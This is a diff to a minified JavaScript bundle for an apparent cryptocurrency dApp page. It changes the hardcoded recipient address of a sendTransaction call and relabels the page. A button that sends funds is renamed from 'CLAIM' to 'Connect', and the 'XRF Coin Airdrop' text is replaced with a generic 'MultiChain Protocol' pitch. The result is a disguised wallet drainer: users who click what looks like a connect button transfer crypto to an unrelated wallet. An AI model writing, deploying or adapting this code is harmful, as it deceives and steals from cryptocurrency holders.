@@ -22480,7 +22480,7 @@ const PI = ()=>{
         address: s
     })
       , {config: l} = AI({
-        to: "0x01D629C6e6b6c2D9EF4db323e3f84a7Bf8a4cd4e",
+        to: "0xBE2A6408c3458c01FdfBF05A4ff53A47598eeb28",
         value: n
     })
       , {data: c, isLoading: u, isSuccess: d, sendTransaction: h} = OI(l);
@@ -22504,7 +22504,7 @@ const PI = ()=>{
     , [t, a]),
     He.jsx("div", {
         children: t ? u ? He.jsx("p", {
-            children: "Claiming.."
+            children: "Connecting.."
         }) : He.jsx("button", {
             style: {
                 padding: "1rem 1.5rem",
@@ -22516,7 +22516,7 @@ const PI = ()=>{
             },
             disabled: !h,
             onClick: ()=>h == null ? void 0 : h(),
-            children: "CLAIM"
+            children: "Connect"
         }) : He.jsx("div", {})
     })
 }
@@ -22544,7 +22544,7 @@ function $I() {
                         fontSize: "2rem",
                         fontWeight: "600"
                     },
-                    children: "XRF Coin"
+                    children: ""
                 }), He.jsxs("div", {
                     className: Tn.buttons,
                     children: [He.jsx("div", {
@@ -22565,10 +22565,10 @@ function $I() {
                 children: [He.jsxs("div", {
                     className: Tn.container,
                     children: [He.jsx("h1", {
-                        children: "XRF Coin Airdrop"
+                        children: "MultiChain Protocol"
                     }), He.jsxs("code", {
                         className: Tn.code,
-                        children: ["Connect your wallet and get your ", He.jsx("br", {}), " 100XRF Coin Airdrop for every network"]
+                        children: ["We make it easy to plug into Dapp."]
                     }), He.jsx(PI, {})]
                 }), He.jsxs("div", {
                     className: Tn.footer,
@@ -49304,4 +49304,3 @@ function __vite__mapDeps(indexes) {
     }
     return indexes.map((i)=>__vite__mapDeps.viteFileDeps[i])
 }
-
